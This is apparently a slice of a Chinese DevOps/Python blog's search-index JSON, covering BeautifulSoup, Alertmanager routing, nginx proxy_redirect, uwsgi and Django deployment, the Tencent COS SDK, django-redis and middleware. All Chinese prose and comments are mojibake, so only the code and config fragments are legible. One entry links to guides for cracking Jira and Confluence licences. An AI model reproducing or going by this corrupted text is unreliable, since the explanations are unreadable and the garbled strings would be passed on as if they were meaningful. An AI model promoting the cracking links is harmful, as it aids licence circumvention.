æŸ¥æ‰¾æ ‡ç­¾################################################################################## # æ‰“å°ç¬¬ä¸€ä¸ªaæ ‡ç­¾ print(soup.a) # soup.xxx xxxä»£è¡¨htmlæ ‡ç­¾å # æŒ‰ç…§å±æ€§æŸ¥æ‰¾ print(soup.find('a', class_='current')) print(soup.find('a', id='logo')) print(soup.find('a', href='https://soulchild.cn/')) # æŸ¥æ‰¾æ‰€æœ‰aæ ‡ç­¾ print(soup.find_all('a')) # ä½¿ç”¨htmlé€‰æ‹©å™¨æ¥é€‰æ‹©æ ‡ç­¾ print('---------', soup.select('#logo')) print('---------', soup.select('.col-mb-12 h2')) #è·å–å†…å®¹################################################################################## # è·å–æ ‡ç­¾ä¸­çš„æ–‡æœ¬æ•°æ® print('*' * 50) print(soup.find('a', class_='current').get_text()) print(soup.find('a', class_='current').text) print(soup.find('a', class_='current').string) # åªèƒ½è·å–æ ‡ç­¾æœ¬èº«çš„æ–‡æœ¬æ•°æ®,å­æ ‡ç­¾çš„ä¸ä¼šè·å– # è·å–æ ‡ç­¾çš„å±æ€§å€¼ print(soup.find('a', class_='current')['href']) ","date":"2020-11-16 16:05","objectID":"/post/2074/:0:0","tags":["python"],"title":"BeautifulSoup-åŸºç¡€","uri":"/post/2074/"},{"categories":["ç›‘æ§"],"content":"1.é…ç½®æ–‡ä»¶ global: # ç»è¿‡æ­¤æ—¶é—´åï¼Œå¦‚æœå°šæœªæ›´æ–°å‘Šè­¦ï¼Œåˆ™å°†å‘Šè­¦å£°æ˜ä¸ºå·²æ¢å¤ã€‚(å³prometheusæ²¡æœ‰å‘alertmanagerå‘é€å‘Šè­¦äº†) resolve_timeout: 5m # é…ç½®å‘é€é‚®ä»¶ä¿¡æ¯ smtp_smarthost: 'smtp.qq.com:465' smtp_from: '742899387@qq.com' smtp_auth_username: '742899387@qq.com' smtp_auth_password: 'password' smtp_require_tls: false # è¯»å–å‘Šè­¦é€šçŸ¥æ¨¡æ¿çš„ç›®å½•ã€‚ templates: - '/etc/alertmanager/template/*.tmpl' # æ‰€æœ‰æŠ¥è­¦éƒ½ä¼šè¿›å…¥åˆ°è¿™ä¸ªæ ¹è·¯ç”±ä¸‹ï¼Œå¯ä»¥æ ¹æ®æ ¹è·¯ç”±ä¸‹çš„å­è·¯ç”±è®¾ç½®æŠ¥è­¦åˆ†å‘ç­–ç•¥ route: # å…ˆè§£é‡Šä¸€ä¸‹åˆ†ç»„ï¼Œåˆ†ç»„å°±æ˜¯å°†å¤šæ¡å‘Šè­¦ä¿¡æ¯èšåˆæˆä¸€æ¡å‘é€ï¼Œè¿™æ ·å°±ä¸ä¼šæ”¶åˆ°è¿ç»­çš„æŠ¥è­¦äº†ã€‚ # å°†ä¼ å…¥çš„å‘Šè­¦æŒ‰æ ‡ç­¾åˆ†ç»„(æ ‡ç­¾åœ¨prometheusä¸­çš„rulesä¸­å®šä¹‰)ï¼Œä¾‹å¦‚ï¼š # æ¥æ”¶åˆ°çš„å‘Šè­¦ä¿¡æ¯é‡Œé¢æœ‰è®¸å¤šå…·æœ‰cluster=A å’Œ alertname=LatencyHighçš„æ ‡ç­¾ï¼Œè¿™äº›ä¸ªå‘Šè­¦å°†è¢«åˆ†ä¸ºä¸€ä¸ªç»„ã€‚ # # å¦‚æœä¸æƒ³ä½¿ç”¨åˆ†ç»„ï¼Œå¯ä»¥è¿™æ ·å†™group_by: [...] group_by: ['alertname', 'cluster', 'service'] # ç¬¬ä¸€ç»„å‘Šè­¦å‘é€é€šçŸ¥éœ€è¦ç­‰å¾…çš„æ—¶é—´ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç¡®ä¿æœ‰è¶³å¤Ÿçš„æ—¶é—´ä¸ºåŒä¸€åˆ†ç»„è·å–å¤šä¸ªå‘Šè­¦ï¼Œç„¶åä¸€èµ·è§¦å‘è¿™ä¸ªå‘Šè­¦ä¿¡æ¯ã€‚ group_wait: 30s # å‘é€ç¬¬ä¸€ä¸ªå‘Šè­¦åï¼Œç­‰å¾…\"group_interval\"å‘é€ä¸€ç»„æ–°å‘Šè­¦ã€‚ group_interval: 5m # åˆ†ç»„å†…å‘é€ç›¸åŒå‘Šè­¦çš„æ—¶é—´é—´éš”ã€‚è¿™é‡Œçš„é…ç½®æ˜¯æ¯3å°æ—¶å‘é€å‘Šè­¦åˆ°åˆ†ç»„ä¸­ã€‚ä¸¾ä¸ªä¾‹å­ï¼šæ”¶åˆ°å‘Šè­¦åï¼Œä¸€ä¸ªåˆ†ç»„è¢«åˆ›å»ºï¼Œç­‰å¾…5åˆ†é’Ÿå‘é€ç»„å†…å‘Šè­¦ï¼Œå¦‚æœåç»­ç»„å†…çš„å‘Šè­¦ä¿¡æ¯ç›¸åŒ,è¿™äº›å‘Šè­¦ä¼šåœ¨3å°æ—¶åå‘é€ï¼Œä½†æ˜¯3å°æ—¶å†…è¿™äº›å‘Šè­¦ä¸ä¼šè¢«å‘é€ã€‚ repeat_interval: 3h # è¿™é‡Œå…ˆè¯´ä¸€ä¸‹ï¼Œå‘Šè­¦å‘é€æ˜¯éœ€è¦æŒ‡å®šæ¥æ”¶å™¨çš„ï¼Œæ¥æ”¶å™¨åœ¨receiversä¸­é…ç½®ï¼Œæ¥æ”¶å™¨å¯ä»¥æ˜¯emailã€webhookã€pagerdutyã€wechatç­‰ç­‰ã€‚ä¸€ä¸ªæ¥æ”¶å™¨å¯ä»¥æœ‰å¤šç§å‘é€æ–¹å¼ã€‚ # æŒ‡å®šé»˜è®¤çš„æ¥æ”¶å™¨ receiver: team-X-mails # ä¸‹é¢é…ç½®çš„æ˜¯å­è·¯ç”±ï¼Œå­è·¯ç”±çš„å±æ€§ç»§æ‰¿äºæ ¹è·¯ç”±(å³ä¸Šé¢çš„é…ç½®)ï¼Œåœ¨å­è·¯ç”±ä¸­å¯ä»¥è¦†ç›–æ ¹è·¯ç”±çš„é…ç½® # ä¸‹é¢æ˜¯å­è·¯ç”±çš„é…ç½® routes: # ä½¿ç”¨æ­£åˆ™çš„æ–¹å¼åŒ¹é…å‘Šè­¦æ ‡ç­¾ - match_re: # è¿™é‡Œå¯ä»¥åŒ¹é…å‡ºæ ‡ç­¾å«æœ‰service=foo1æˆ–service=foo2æˆ–service=bazçš„å‘Šè­¦ service: ^(foo1|foo2|baz)$ # æŒ‡å®šæ¥æ”¶å™¨ä¸ºteam-X-mails receiver: team-X-mails # è¿™é‡Œé…ç½®çš„æ˜¯å­è·¯ç”±çš„å­è·¯ç”±ï¼Œå½“æ»¡è¶³çˆ¶è·¯ç”±çš„çš„åŒ¹é…æ—¶ï¼Œè¿™æ¡å­è·¯ç”±ä¼šè¿›ä¸€æ­¥åŒ¹é…å‡ºseverity=criticalçš„å‘Šè­¦ï¼Œå¹¶ä½¿ç”¨team-X-pageræ¥æ”¶å™¨å‘é€å‘Šè­¦ï¼Œæ²¡æœ‰åŒ¹é…åˆ°çš„å‘Šè­¦ä¼šç”±çˆ¶è·¯ç”±è¿›è¡Œå¤„ç†ã€‚ routes: - match: severity: critical receiver: team-X-pager # è¿™é‡Œä¹Ÿæ˜¯ä¸€æ¡å­è·¯ç”±ï¼Œä¼šåŒ¹é…å‡ºæ ‡ç­¾å«æœ‰service=filesçš„å‘Šè­¦ï¼Œå¹¶ä½¿ç”¨team-Y-mailsæ¥æ”¶å™¨å‘é€å‘Šè­¦ - match: service: files receiver: team-Y-mails # è¿™é‡Œé…ç½®çš„æ˜¯å­è·¯ç”±çš„å­è·¯ç”±ï¼Œå½“æ»¡è¶³çˆ¶è·¯ç”±çš„çš„åŒ¹é…æ—¶ï¼Œè¿™æ¡å­è·¯ç”±ä¼šè¿›ä¸€æ­¥åŒ¹é…å‡ºseverity=criticalçš„å‘Šè­¦ï¼Œå¹¶ä½¿ç”¨team-Y-pageræ¥æ”¶å™¨å‘é€å‘Šè­¦ï¼Œæ²¡æœ‰åŒ¹é…åˆ°çš„ä¼šç”±çˆ¶è·¯ç”±è¿›è¡Œå¤„ç†ã€‚ routes: - match: severity: critical receiver: team-Y-pager # è¯¥è·¯ç”±å¤„ç†æ¥è‡ªæ•°æ®åº“æœåŠ¡çš„æ‰€æœ‰è­¦æŠ¥ã€‚å¦‚æœæ²¡æœ‰å›¢é˜Ÿæ¥å¤„ç†ï¼Œåˆ™é»˜è®¤ä¸ºæ•°æ®åº“å›¢é˜Ÿã€‚ - match: # é¦–å…ˆåŒ¹é…æ ‡ç­¾service=database service: database # æŒ‡å®šæ¥æ”¶å™¨ receiver: team-DB-pager # æ ¹æ®å—å½±å“çš„æ•°æ®åº“å¯¹å‘Šè­¦è¿›è¡Œåˆ†ç»„ group_by: [alertname, cluster, database] routes: - match: owner: team-X receiver: team-X-pager # å‘Šè­¦æ˜¯å¦ç»§ç»­åŒ¹é…åç»­çš„åŒçº§è·¯ç”±èŠ‚ç‚¹ï¼Œé»˜è®¤falseï¼Œä¸‹é¢å¦‚æœä¹Ÿå¯ä»¥åŒ¹é…æˆåŠŸï¼Œä¼šå‘ä¸¤ç§æ¥æ”¶å™¨éƒ½å‘é€å‘Šè­¦ä¿¡æ¯(çŒœæµ‹ã€‚ã€‚ã€‚) continue: true - match: owner: team-Y receiver: team-Y-pager # ä¸‹é¢æ˜¯å…³äºinhibit(æŠ‘åˆ¶)çš„é…ç½®ï¼Œå…ˆè¯´ä¸€ä¸‹æŠ‘åˆ¶æ˜¯ä»€ä¹ˆï¼šæŠ‘åˆ¶è§„åˆ™å…è®¸åœ¨å¦ä¸€ä¸ªè­¦æŠ¥æ­£åœ¨è§¦å‘çš„æƒ…å†µä¸‹ä½¿ä¸€ç»„å‘Šè­¦é™éŸ³ã€‚å…¶å®å¯ä»¥ç†è§£ä¸ºå‘Šè­¦ä¾èµ–ã€‚æ¯”å¦‚ä¸€å°æ•°æ®åº“æœåŠ¡å™¨æ‰ç”µäº†ï¼Œä¼šå¯¼è‡´dbç›‘æ§å‘Šè­¦ã€ç½‘ç»œå‘Šè­¦ç­‰ç­‰ï¼Œå¯ä»¥é…ç½®æŠ‘åˆ¶è§„åˆ™å¦‚æœæœåŠ¡å™¨æœ¬èº«downäº†ï¼Œé‚£ä¹ˆå…¶ä»–çš„æŠ¥è­¦å°±ä¸ä¼šè¢«å‘é€å‡ºæ¥ã€‚ inhibit_rules: #ä¸‹é¢é…ç½®çš„å«ä¹‰ï¼šå½“æœ‰å¤šæ¡å‘Šè­¦åœ¨å‘Šè­¦ç»„é‡Œæ—¶ï¼Œå¹¶ä¸”ä»–ä»¬çš„æ ‡ç­¾alertname,cluster,serviceéƒ½ç›¸ç­‰ï¼Œå¦‚æœseverity: 'critical'çš„å‘Šè­¦äº§ç”Ÿäº†ï¼Œé‚£ä¹ˆå°±ä¼šæŠ‘åˆ¶severity: 'warning'çš„å‘Šè­¦ã€‚ - source_match: # æºå‘Šè­¦(æˆ‘ç†è§£æ˜¯æ ¹æ®è¿™ä¸ªæŠ¥è­¦æ¥æŠ‘åˆ¶target_matchä¸­åŒ¹é…çš„å‘Šè­¦) severity: 'critical' # æ ‡ç­¾åŒ¹é…æ»¡è¶³severity=criticalçš„å‘Šè­¦ä½œä¸ºæºå‘Šè­¦ target_match: # ç›®æ ‡å‘Šè­¦(è¢«æŠ‘åˆ¶çš„å‘Šè­¦) severity: 'warning' # å‘Šè­¦å¿…é¡»æ»¡è¶³æ ‡ç­¾åŒ¹é…severity=warningæ‰ä¼šè¢«æŠ‘åˆ¶ã€‚ equal: ['alertname', 'cluster', 'service'] # å¿…é¡»åœ¨æºå‘Šè­¦å’Œç›®æ ‡å‘Šè­¦ä¸­å…·æœ‰ç›¸ç­‰å€¼çš„æ ‡ç­¾æ‰èƒ½ä½¿æŠ‘åˆ¶ç”Ÿæ•ˆã€‚(å³æºå‘Šè­¦å’Œç›®æ ‡å‘Šè­¦ä¸­è¿™ä¸‰ä¸ªæ ‡ç­¾çš„å€¼ç›¸ç­‰'alertname', 'cluster', 'service') # ä¸‹é¢é…ç½®çš„æ˜¯æ¥æ”¶å™¨ receivers: # æ¥æ”¶å™¨çš„åç§°ã€é€šè¿‡é‚®ä»¶çš„æ–¹å¼å‘é€ã€ - name: 'team-X-mails' email_configs: # å‘é€ç»™å“ªäº›äºº - to: 'team-X+alerts@example.org' # æ˜¯å¦é€šçŸ¥å·²è§£å†³çš„è­¦æŠ¥ send_resolved: true # æ¥æ”¶å™¨çš„åç§°ã€é€šè¿‡é‚®ä»¶å’Œpagerdutyçš„æ–¹å¼å‘é€ã€å‘é€ç»™å“ªäº›äººï¼ŒæŒ‡å®špagerdutyçš„service_key - name: 'team-X-pager' email_configs: - to: 'team-X+alerts-critical@example.org' pagerduty_configs: - service_key: \u003cteam-X-key\u003e # æ¥æ”¶å™¨çš„åç§°ã€é€šè¿‡é‚®ä»¶çš„æ–¹å¼å‘é€ã€å‘é€ç»™å“ªäº›äºº - name: 'team-Y-mails' email_configs: - to: 'team-Y+alerts@example.org' # æ¥æ”¶å™¨çš„åç§°ã€é€šè¿‡pagerdutyçš„æ–¹å¼å‘é€ã€æŒ‡å®špagerdutyçš„service_key - name: 'team-Y-pager' pagerduty_configs: - service_key: \u003cteam-Y-key\u003e # ä¸€ä¸ªæ¥æ”¶å™¨é…ç½®å¤šç§å‘é€æ–¹å¼ - name: 'ops' webhook_configs: - url: 'http://prometheus-webhook-dingtalk.kube-ops.svc.cluster.local:8060/dingtalk/webhook1/send' send_resolved: true email_configs: - to: '742899387@qq.com' send_resolved: true - to: 'soulchild@soulchild.cn' send_resolved: true ","date":"2020-11-16 15:31","objectID":"/post/2073/:1:0","tags":["prometheus","alertmanager"],"title":"alertmanageré…ç½®æ–‡ä»¶è¯¦è§£(å››)","uri":"/post/2073/"},{"categories":["ç›‘æ§"],"content":"2.æ¥æ”¶å™¨è¯¦ç»†å‚æ•°é…ç½®æ–‡æ¡£ email: https://prometheus.io/docs/alerting/latest/configuration/#email_config webhook: https://prometheus.io/docs/alerting/latest/configuration/#webhook_config wechat: https://prometheus.io/docs/alerting/latest/configuration/#wechat_config pagerdutyï¼šhttps://prometheus.io/docs/alerting/latest/configuration/#pagerduty_config ","date":"2020-11-16 15:31","objectID":"/post/2073/:2:0","tags":["prometheus","alertmanager"],"title":"alertmanageré…ç½®æ–‡ä»¶è¯¦è§£(å››)","uri":"/post/2073/"},{"categories":["å…¶ä»–"],"content":"jira: https://wiki.shileizcc.com/confluence/display/atlassian/Jire+install+8.11.0 confluence: https://wiki.shileizcc.com/confluence/display/atlassian/Confluence+install+7.0.1 ","date":"2020-11-11 16:17","objectID":"/post/2072/:0:0","tags":[],"title":"jira\u0026amp;confluenceå®‰è£…ç ´è§£","uri":"/post/2072/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å½“nginxä»£ç†çš„åç«¯æœåŠ¡å™¨æœ‰301ã€302é‡å®šå‘æ—¶,æˆ‘ä»¬å¯ä»¥é€šè¿‡proxy_redirectæ¥é‡å†™Locationè¯·æ±‚å¤´ã€‚ ä¾‹å¦‚: location /test/ { proxy_pass http://127.0.0.1:8000; } ä¸Šé¢çš„é…ç½®ä¸­ è®¿é—®xxx.com/test/,ä¼šè¢«åå‘ä»£ç†åˆ°åç«¯çš„http://127.0.0.1:8000/test/ ç”±äºhttp://127.0.0.1:8000/test/è¿™ä¸ªåœ°å€ä¼šé‡å®šå‘åˆ°http://127.0.0.1:8000/index/ æ­¤æ—¶æµè§ˆå™¨ä¼šè·³è½¬åˆ°http://127.0.0.1:8000/index/ï¼Œ127.0.0.1çš„åœ°å€è‚¯å®šä¸æ˜¯æˆ‘ä»¬å¸Œæœ›è¿”å›çš„ç»“æœã€‚ åœ¨ä¸Šé¢çš„é…ç½®ä¸­åšä¸€äº›ä¿®æ”¹ï¼š location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) $1; } ç°åœ¨çš„è¿”å›ç»“æœå°±æ˜¯xxx.com/test/index ä¸€äº›å…¶ä»–çš„urlè½¬æ¢ï¼š location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) $1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/test/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) aaa/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/test/aaa/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) /aaa/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/aaa/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) $schema://$host/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) http://soulchild.cn/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://soulchild.cn/index/ ","date":"2020-11-05 09:04","objectID":"/post/2066/:0:0","tags":["nginx"],"title":"nginx-proxy_redirect","uri":"/post/2066/"},{"categories":["python"],"content":"1. uwsgié…ç½®æ–‡ä»¶ [uwsgi] ;socketç›‘å¬åœ°å€ socket=/tmp/app.sock ;httpç›‘å¬åœ°å€ ;http=127.0.0.1:8000 ;é¡¹ç›®ç›®å½• chdir=/application/xxx ;é…ç½®wsgiæ¥å£æ¨¡å—æ–‡ä»¶è·¯å¾„,wsgi.pyè¿™ä¸ªæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å ;wsgi-file=xxx/wsgi.py ;å¯åŠ¨çš„è¿›ç¨‹æ•° processes=4 ;æ¯ä¸ªè¿›ç¨‹çš„çº¿ç¨‹æ•° threads=2 ;å¯åŠ¨ç®¡ç†ä¸»è¿›ç¨‹ master=true ;å­˜æ”¾ä¸»è¿›ç¨‹çš„pidæ–‡ä»¶ pidfile=uwsgi.pid ;åå°è¿è¡Œ,å¹¶è®¾ç½®ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶è·¯å¾„ daemonize=uwsgi.log ;è®¾ç½®è™šæ‹Ÿç¯å¢ƒè·¯å¾„ ;virtualenv=/xxx/.virtualenvs/xxx/ ","date":"2020-11-04 14:44","objectID":"/post/2065/:1:0","tags":["nginx","django"],"title":"nginx+uwsgiéƒ¨ç½²djangoé¡¹ç›®","uri":"/post/2065/"},{"categories":["python"],"content":"å¯åŠ¨åœæ­¢ç›¸å…³å‘½ä»¤ï¼š å¯åŠ¨: uwsgi --ini uwsgi.ini åœæ­¢: uwsgi --stop uwsgi.pid é‡æ–°åŠ è½½: uwsgi --reload ","date":"2020-11-04 14:44","objectID":"/post/2065/:1:1","tags":["nginx","django"],"title":"nginx+uwsgiéƒ¨ç½²djangoé¡¹ç›®","uri":"/post/2065/"},{"categories":["python"],"content":"2.æ”¶é›†djangoé™æ€æ–‡ä»¶ 2.1åœ¨settings.pyä¸­æ·»åŠ å¦‚ä¸‹é…ç½®: STATIC_ROOT = BASE_DIR / \"nginx\" 2.2æ”¶é›†é™æ€æ–‡ä»¶ python3 manage.py collectstatic ","date":"2020-11-04 14:44","objectID":"/post/2065/:2:0","tags":["nginx","django"],"title":"nginx+uwsgiéƒ¨ç½²djangoé¡¹ç›®","uri":"/post/2065/"},{"categories":["python"],"content":"3.é…ç½®nginx server { listen 80; server_name test.com; location / { uwsgi_pass 127.0.0.1:8000; include /etc/nginx/uwsgi_params; } # é…ç½®é™æ€æ–‡ä»¶ç›®å½• location /static { alias /xxxx/nginx/; } } ","date":"2020-11-04 14:44","objectID":"/post/2065/:3:0","tags":["nginx","django"],"title":"nginx+uwsgiéƒ¨ç½²djangoé¡¹ç›®","uri":"/post/2065/"},{"categories":["python"],"content":"https://opensupport.alipay.com/support/helpcenter/192/201602471955?ant_source=antsupport#anchor__17 ","date":"2020-11-03 17:57","objectID":"/post/2064/:0:0","tags":["python"],"title":"æ”¯ä»˜å®éªŒç­¾","uri":"/post/2064/"},{"categories":["python"],"content":" yum install -y openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel wget https://www.python.org/ftp/python/3.6.4/Python-3.6.4.tgz tar -zxvf Python-3.6.4.tgz cd Python-3.6.4 ./configure make make install ","date":"2020-10-29 18:36","objectID":"/post/2063/:0:0","tags":["python"],"title":"python3ç¯å¢ƒå®‰è£…","uri":"/post/2063/"},{"categories":["python"],"content":" pip install -U cos-python-sdk-v5 åˆå§‹åŒ–ä»£ç  # -*- coding=utf-8 # appid å·²åœ¨é…ç½®ä¸­ç§»é™¤,è¯·åœ¨å‚æ•° Bucket ä¸­å¸¦ä¸Š appidã€‚Bucket ç”± BucketName-APPID ç»„æˆ # 1. è®¾ç½®ç”¨æˆ·é…ç½®, åŒ…æ‹¬ secretIdï¼ŒsecretKey ä»¥åŠ Region from qcloud_cos import CosConfig from qcloud_cos import CosS3Client import sys import logging logging.basicConfig(level=logging.INFO, stream=sys.stdout) secret_id = 'COS_SECRETID' # æ›¿æ¢ä¸ºç”¨æˆ·çš„ secretId secret_key = 'COS_SECRETKEY' # æ›¿æ¢ä¸ºç”¨æˆ·çš„ secretKey region = 'ap-shanghai' # æ›¿æ¢ä¸ºç”¨æˆ·çš„ Region token = None # ä½¿ç”¨ä¸´æ—¶å¯†é’¥éœ€è¦ä¼ å…¥ Tokenï¼Œé»˜è®¤ä¸ºç©ºï¼Œå¯ä¸å¡« scheme = 'https' # æŒ‡å®šä½¿ç”¨ http/https åè®®æ¥è®¿é—® COSï¼Œé»˜è®¤ä¸º httpsï¼Œå¯ä¸å¡« config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token, Scheme=scheme) # 2. è·å–å®¢æˆ·ç«¯å¯¹è±¡ client = CosS3Client(config) æ¡¶æ“ä½œ # åˆ›å»ºæ¡¶(\u003cbucketname\u003e-\u003cappid\u003e) response = client.create_bucket( Bucket='examplebucket-1250000000' ) # æŸ¥çœ‹æ¡¶ response = client.list_buckets() ä¸Šä¼ å¯¹è±¡ #### æ–‡ä»¶æµç®€å•ä¸Šä¼ ï¼ˆä¸æ”¯æŒè¶…è¿‡5Gçš„æ–‡ä»¶ï¼Œæ¨èä½¿ç”¨ä¸‹æ–¹é«˜çº§ä¸Šä¼ æ¥å£ï¼‰ # å¼ºçƒˆå»ºè®®æ‚¨ä»¥äºŒè¿›åˆ¶æ¨¡å¼(binary mode)æ‰“å¼€æ–‡ä»¶,å¦åˆ™å¯èƒ½ä¼šå¯¼è‡´é”™è¯¯ ####################################################################################### # å­—èŠ‚æµä¸Šä¼  with open('picture.jpg', 'rb') as fp: # é€šè¿‡å®¢æˆ·ç«¯å¯¹è±¡,put_objectæ–¹æ³•ä¸Šä¼ æ–‡ä»¶ response = client.put_object( Bucket='examplebucket-1250000000', # æ¡¶åç§° Body=fp, # ä¸Šä¼ çš„å†…å®¹-bytesç±»å‹ Key='picture.jpg', # æ¡¶ä¸­çš„æ–‡ä»¶åç›¸å¯¹è·¯å¾„ EnableMD5=False # è®¡ç®—md5 ) # è·å–ä¸Šä¼ å“åº” print(response['ETag']) ####################################################################################### import requests stream = requests.get('https://cloud.tencent.com/document/product/436/7778') # ç½‘ç»œæµå°†ä»¥ Transfer-Encoding:chunked çš„æ–¹å¼ä¼ è¾“åˆ° COS response = client.put_object( Bucket='examplebucket-1250000000', Body=stream, Key='picture.jpg' ) print(response['ETag']) ####################################################################################### #### é«˜çº§ä¸Šä¼ æ¥å£ï¼ˆæ¨èï¼‰ # æ ¹æ®æ–‡ä»¶å¤§å°è‡ªåŠ¨é€‰æ‹©ç®€å•ä¸Šä¼ æˆ–åˆ†å—ä¸Šä¼ ï¼Œåˆ†å—ä¸Šä¼ å…·å¤‡æ–­ç‚¹ç»­ä¼ åŠŸèƒ½ã€‚ response = client.upload_file( Bucket='examplebucket-1250000000', # æ¡¶åç§° LocalFilePath='local.txt', # æœ¬åœ°æ–‡ä»¶è·¯å¾„ Key='picture.jpg', # æ¡¶ä¸­çš„æ–‡ä»¶åç›¸å¯¹è·¯å¾„ PartSize=1, # åˆ†å—ä¸‹è½½çš„åˆ†å—å¤§å°ï¼Œé»˜è®¤ä¸º20MB MAXThread=10, # åˆ†å—ä¸‹è½½çš„å¹¶å‘æ•°é‡ï¼Œé»˜è®¤ä¸º5ä¸ªçº¿ç¨‹ä¸‹è½½åˆ†å— EnableMD5=False # è®¡ç®—md5 ) print(response['ETag']) ","date":"2020-10-27 11:45","objectID":"/post/2062/:0:0","tags":["python"],"title":"è…¾è®¯äº‘coså¯¹è±¡å­˜å‚¨python SDKä½¿ç”¨","uri":"/post/2062/"},{"categories":["python"],"content":"path urlpatterns = [ path('', views.index, name=\"index\"), path('home/', views.home, name=\"home\"), # å¸¦å‚æ•°çš„è·¯ç”±url,è·¯å¾„è½¬æ¢å™¨ # å®˜æ–¹æ–‡æ¡£:https://docs.djangoproject.com/zh-hans/2.2/topics/http/urls/#path-converters # intç±»å‹,\u003cint:age\u003eåªä¼šåŒ¹é…æ•´æ•°ç±»å‹ path('show/\u003cint:age\u003e/', views.show, name=\"show\"), # slugç±»å‹,åªåŒ¹é…æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ path('list/\u003cslug:name\u003e/', views.list_user, name=\"list_user\"), # pathç±»å‹,åŒ¹é…æ‰€æœ‰å†…å®¹ path('access/\u003cpath:c1\u003e/', views.access, name=\"access\"), # ç›´æ¥ä½¿ç”¨å‚æ•° path('\u003cname\u003e/\u003cage\u003e', views.test2, name=\"arg\"), ] ","date":"2020-10-23 16:25","objectID":"/post/2061/:1:0","tags":["python","django"],"title":"django-è·¯ç”±è§„åˆ™","uri":"/post/2061/"},{"categories":["python"],"content":"re_path # re_path re_path(r'(?P\u003carg1\u003e^a\\d+)/(?P\u003carg2\u003e\\d{2})/', views.test1, name=\"re_arg\"), re_path(r'tel/(?P\u003cphone\u003e(^13[0-9]|14[579]|15[0-3,5-9]|16[6]|17[0135678]|18[0-9]|19[89])\\d{8})/$', views.get_phone, name=\"get_phone\"), ","date":"2020-10-23 16:25","objectID":"/post/2061/:2:0","tags":["python","django"],"title":"django-è·¯ç”±è§„åˆ™","uri":"/post/2061/"},{"categories":["python"],"content":"ä¸­æ–‡æ–‡æ¡£ï¼šhttps://django-redis-chs.readthedocs.io/zh_CN/latest/ ","date":"2020-10-18 18:07","objectID":"/post/2055/:0:0","tags":["python","django"],"title":"django-æ“ä½œdjango-redis","uri":"/post/2055/"},{"categories":["python"],"content":"1.å®‰è£…django-redis pip install redis django-redis ","date":"2020-10-18 18:07","objectID":"/post/2055/:1:0","tags":["python","django"],"title":"django-æ“ä½œdjango-redis","uri":"/post/2055/"},{"categories":["python"],"content":"2.é…ç½®settings.py CACHES = { \"default\": { \"BACKEND\": \"django_redis.cache.RedisCache\", \"LOCATION\": \"redis://127.0.0.1:6379/1\", \"OPTIONS\": { \"CLIENT_CLASS\": \"django_redis.client.DefaultClient\", \"CONNECTION_POOL_KWARGS\": {\"max_connections\": 100}, \"PASSWORD\": \"\", } } } ","date":"2020-10-18 18:07","objectID":"/post/2055/:2:0","tags":["python","django"],"title":"django-æ“ä½œdjango-redis","uri":"/post/2055/"},{"categories":["python"],"content":"3.ä½¿ç”¨ from django_redis import get_redis_connection # ä»è¿æ¥æ± è·å–ä¸€ä¸ªè¿æ¥ redis_conn = get_redis_connection('default') # è®¾ç½®key redis_conn.set() # è·å–key redis_conn.get() # æ¸…é™¤æ‰€æœ‰åº“çš„æ‰€æœ‰key redis_conn.flushall() # æ¸…é™¤å½“å‰åº“çš„æ‰€æœ‰key redis_conn.flushdb() ","date":"2020-10-18 18:07","objectID":"/post/2055/:3:0","tags":["python","django"],"title":"django-æ“ä½œdjango-redis","uri":"/post/2055/"},{"categories":["python"],"content":"4.å°†redisåšä¸ºdjangoçš„sessionå­˜å‚¨ ä¿®æ”¹settings.py SESSION_ENGINE = \"django.contrib.sessions.backends.cache\" SESSION_CACHE_ALIAS = \"default\" ","date":"2020-10-18 18:07","objectID":"/post/2055/:4:0","tags":["python","django"],"title":"django-æ“ä½œdjango-redis","uri":"/post/2055/"},{"categories":["python"],"content":"django1.xçš„ä½¿ç”¨æ–¹æ³• ","date":"2020-10-14 13:08","objectID":"/post/2053/:1:0","tags":["python","django"],"title":"django-ä¸­é—´ä»¶","uri":"/post/2053/"},{"categories":["python"],"content":"1.åœ¨åº”ç”¨ç›®å½•ä¸‹å»ºç«‹middleware.py # ç±»åå¯ä»¥è‡ªå®šä¹‰ class TestMiddleware: \"\"\"ä¸­é—´ä»¶ç±»\"\"\" # ä¸­é—´ä»¶å‡½æ•°åæ˜¯å›ºå®šçš„ def __init__(self): \"\"\"æœåŠ¡é‡å¯ä¹‹åï¼Œæ¥æ”¶ç¬¬ä¸€ä¸ªè¯·æ±‚æ—¶è°ƒç”¨\"\"\" print('____initä¸­é—´ä»¶____') def process_request(self, request): \"\"\"äº§ç”Ÿrequestçš„æ—¶å€™è°ƒç”¨ï¼Œåœ¨urlåŒ¹é…ä¹‹å‰\"\"\" print('____requestä¸­é—´ä»¶____') def process_view(self, request, *args, **kwargs): \"\"\"urlåŒ¹é…å,è§†å›¾å‡½æ•°è°ƒç”¨å‰\"\"\" print('____viewä¸­é—´ä»¶____') def process_response(self, request, response): \"\"\"è§†å›¾å‡½æ•°è°ƒç”¨åï¼Œè¿”å›ç»™å®¢æˆ·ç«¯å‰è°ƒç”¨\"\"\" return response def process_exception(self, request, exception): \"\"\"è§†å›¾å‡½æ•°å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè°ƒç”¨æ¬¡å‡½æ•°\"\"\" # return HttpResponse(exception1) print('process_exception---Test1') ","date":"2020-10-14 